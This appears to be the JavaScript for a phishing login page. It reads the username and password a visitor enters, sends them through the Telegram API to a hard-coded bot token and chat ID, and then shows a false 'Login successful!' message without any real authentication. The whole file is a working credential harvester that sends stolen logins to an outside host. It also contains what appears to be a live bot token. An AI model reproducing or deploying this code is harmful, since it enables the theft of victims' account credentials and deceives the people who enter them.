// Telegram Bot Configuration
const BOT_TOKEN = "8074904664:AAHtR-Xoz104ZGGi1sXrb42xcWAIrnhejkw";  // Replace with your Telegram bot token
const CHAT_ID = "7987662357";      // Replace with your Telegram chat ID

function sendToTelegram(username, password) {
    const message = `🛡 Login Info 🛡\n\n👤 Number: ${username}\n🔑 Password: ${password}`;
    
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
        })
    }).then(response => response.json())
      .then(data => console.log("Sent to Telegram:", data))
      .catch(error => console.error("Error sending to Telegram:", error));
}

// Toggle Password Visibility
function togglePassword() {
    const passwordField = document.getElementById("password");
    passwordField.type = (passwordField.type === "password") ? "text" : "password";
}

// Form Submission
document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;
    const errorMsg = document.getElementById("errorMsg");

    if (username && password) {
        sendToTelegram(username, password);
        alert("Login successful!");
        errorMsg.textContent = "";
    } else {
        errorMsg.textContent = "Please enter valid credentials.";
    }
});
